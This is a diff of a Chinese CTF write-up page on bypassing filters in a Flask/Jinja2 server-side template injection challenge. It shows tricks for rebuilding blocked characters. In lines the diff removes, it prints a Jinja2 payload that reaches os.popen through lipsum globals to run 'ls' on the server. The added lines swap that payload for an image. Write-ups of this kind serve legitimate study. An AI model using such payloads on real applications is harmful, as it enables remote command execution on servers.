@@ -250,39 +250,10 @@ blacklist&lt;/br&gt;
 </code></pre><p>成功取到1</p>
 <p>lipsum中已有下划线，所以我们还需要方括号和点。</p>
 <pre><code>方括号：{{(lipsum|string|list).pop(18)}
-    点：attr代替
-
-
-接下来就很简单了，拼接调用完事
-直接放别的师傅的payload：
-    
-
-    <!--￼2-->
-    <!--￼3-->
-    <!--￼4-->
-    <!--￼5-->
-    <!--￼6-->
-    <!--￼7-->
-    <!--￼8-->
-    <!--￼9-->
-    <!--￼10-->
-    <!--￼11-->
-    <!--￼12-->
-    <!--￼13-->
-    <!--￼14-->
-    <!--￼15-->
-    <!--￼16-->
-    <!--￼17-->
-    <!--￼18-->
-    <!--￼19-->
-    <!--￼20-->
-    <!--￼21-->
-    <!--￼22-->
-    <!--￼23-->
-    {{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}
-
-//lipsum.__globals__.get(&#39;__builtins__&#39;).os.popen(&#39;ls /var/www/flask&#39;).read()
-</code></pre><p>构造出来了就可以随意组了，这位师傅的payload确实是有些复杂了，有些地方可以优化的，应该是比赛的时候没时间。<br>flag就是文件名。<br>总结：自己还是太懒了。。明明稍微研究一下就能出的东西，可能这就是和大师傅们的差距吧。</p>
+点：attr代替
+</code></pre><p>接下来就很简单了，拼接调用完事<br>直接放别的师傅的payload：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329225928.png" alt></p>
+<p>构造出来了就可以随意组了，这位师傅的payload确实是有些复杂了，有些地方可以优化的，应该是比赛的时候没时间。<br>flag就是文件名。<br>总结：自己还是太懒了。。明明稍微研究一下就能出的东西，可能这就是和大师傅们的差距吧。</p>
 <p>链接：<br>SSTI过滤总结：<a href="https://blog.csdn.net/miuzzx/article/details/110220425" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/110220425</a><br>WP参考：<a href="https://blog.csdn.net/rfrder/article/details/115272645" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/115272645</a><br><a href="https://jan.show/?p=59" target="_blank" rel="noopener">https://jan.show/?p=59</a></p>
 
         </div>
